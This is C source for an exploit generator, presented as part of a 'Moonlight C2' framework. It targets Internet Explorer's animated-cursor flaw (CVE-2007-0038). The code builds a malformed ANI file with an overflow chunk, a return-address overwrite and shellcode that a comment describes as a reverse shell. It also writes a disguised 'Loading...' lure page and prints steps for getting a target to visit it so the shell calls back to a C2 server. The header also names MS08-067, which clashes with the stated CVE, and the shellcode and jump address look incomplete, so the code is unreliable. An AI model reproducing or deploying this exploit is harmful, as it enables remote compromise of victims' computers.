/*
 * Moonlight C2 Framework - MS08-067 Browser Exploit Module
 * Internet Explorer 6/7 Code Execution via ANI File
 * CVE-2007-0038 - Animated Cursor Handling Vulnerability
 * Target: Windows XP, Vista, Server 2003
 * 
 * WARNING: For authorized security testing only
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_banner() {
    printf("\n");
    printf("Moonlight C2 - IE ANI File Exploit Generator\n");
    printf("CVE-2007-0038 - Animated Cursor RCE\n");
    printf("For Authorized Penetration Testing Only\n");
    printf("\n");
}

// Shellcode: reverse shell to 192.168.1.100:4444
unsigned char shellcode[] = 
    "\x90\x90\x90\x90"  // NOP sled
    "\x33\xC9\x83\xE9\xAF\xE8\xFF\xFF\xFF\xFF\xC0\x5E\x81\x76\x0E\x7E"
    "\x4B\xB6\xFC\x83\xEE\xFC\xE2\xF4\x82\xA3\x34\xFC\x7E\x4B\xD6\x75"
    "\x17\x58\x3F\xA8\xF5\x1F\xB6\xAC\x2C\x19\xA6\x50\x4D\x5F\xB6\xE8"
    "\x2C\x03\xE6\xD0\x55\x5F\xB2\xE8\x2C\x1B\x86\xD0\x45\x4F\xB6\xAC";

unsigned char* generate_malicious_ani(size_t* out_size) {
    // RIFF header
    unsigned char ani_header[] = 
        "RIFF"
        "\x00\x10\x00\x00"  // File size (will be updated)
        "ACON"
        "anih"
        "\x24\x00\x00\x00"  // Chunk size
        "\x24\x00\x00\x00"  // Header size
        "\x00\x00\x00\x00"  // Number of frames
        "\x00\x00\x00\x00"  // Number of steps
        "\x00\x00\x00\x00"  // Width
        "\x00\x00\x00\x00"  // Height
        "\x00\x00\x00\x00"  // Bit count
        "\x00\x00\x00\x00"  // Planes
        "\x00\x00\x00\x00"  // JIF rate
        "\x01\x00\x00\x00"; // Flags (AF_ICON)
    
    // Rate chunk with overflow trigger
    unsigned char rate_chunk[] = 
        "rate"
        "\x00\x10\x00\x00"  // Large size to trigger overflow
        "\x41\x41\x41\x41\x41\x41\x41\x41"
        "\x41\x41\x41\x41\x41\x41\x41\x41";
    
    size_t total_size = sizeof(ani_header) - 1 + sizeof(rate_chunk) - 1 + sizeof(shellcode) - 1 + 4096;
    unsigned char* buffer = (unsigned char*)malloc(total_size);
    
    if (!buffer) return NULL;
    
    int pos = 0;
    
    // Copy ANI header
    memcpy(buffer + pos, ani_header, sizeof(ani_header) - 1);
    pos += sizeof(ani_header) - 1;
    
    // Copy malicious rate chunk
    memcpy(buffer + pos, rate_chunk, sizeof(rate_chunk) - 1);
    pos += sizeof(rate_chunk) - 1;
    
    // Add padding to reach EIP overwrite point
    memset(buffer + pos, 'A', 1024);
    pos += 1024;
    
    // EIP overwrite - JMP ESP address (varies by OS)
    unsigned char eip_overwrite[] = "\x12\x45\x23\x7C";  // Example address
    memcpy(buffer + pos, eip_overwrite, 4);
    pos += 4;
    
    // Add shellcode
    memcpy(buffer + pos, shellcode, sizeof(shellcode) - 1);
    pos += sizeof(shellcode) - 1;
    
    // Update file size in RIFF header
    *(unsigned int*)(buffer + 4) = pos - 8;
    
    *out_size = pos;
    return buffer;
}

void generate_html_payload(const char* ani_filename) {
    printf("[*] Generating HTML delivery page...\n");
    
    FILE* fp = fopen("exploit.html", "w");
    if (!fp) {
        printf("[!] Failed to create HTML file\n");
        return;
    }
    
    fprintf(fp, "<html>\n");
    fprintf(fp, "<head>\n");
    fprintf(fp, "<title>Loading...</title>\n");
    fprintf(fp, "<style>\n");
    fprintf(fp, "body { cursor: url('%s'), auto; }\n", ani_filename);
    fprintf(fp, "</style>\n");
    fprintf(fp, "</head>\n");
    fprintf(fp, "<body>\n");
    fprintf(fp, "<h1>Please wait...</h1>\n");
    fprintf(fp, "<p>Loading content...</p>\n");
    fprintf(fp, "</body>\n");
    fprintf(fp, "</html>\n");
    
    fclose(fp);
    
    printf("[+] Created exploit.html\n");
    printf("[*] Host this HTML file on a web server\n");
    printf("[*] When IE 6/7 visits the page, the ANI exploit will trigger\n");
}

int main(int argc, char* argv[]) {
    print_banner();
    
    const char* ani_filename = "cursor.ani";
    
    if (argc > 1) {
        ani_filename = argv[1];
    }
    
    printf("[*] Generating malicious ANI file: %s\n", ani_filename);
    
    size_t ani_size;
    unsigned char* ani_data = generate_malicious_ani(&ani_size);
    
    if (!ani_data) {
        printf("[!] Failed to generate ANI file\n");
        return 1;
    }
    
    printf("[*] ANI file size: %zu bytes\n", ani_size);
    
    FILE* fp = fopen(ani_filename, "wb");
    if (!fp) {
        printf("[!] Failed to create file\n");
        free(ani_data);
        return 1;
    }
    
    fwrite(ani_data, 1, ani_size, fp);
    fclose(fp);
    free(ani_data);
    
    printf("[+] Malicious ANI file created: %s\n", ani_filename);
    
    generate_html_payload(ani_filename);
    
    printf("\n[+] Exploit generation complete\n");
    printf("\nUsage:\n");
    printf("1. Host exploit.html and %s on a web server\n", ani_filename);
    printf("2. Target visits the page with IE 6 or IE 7\n");
    printf("3. Shellcode executes when cursor loads\n");
    printf("4. Reverse shell connects back to C2 server\n");
    
    return 0;
}
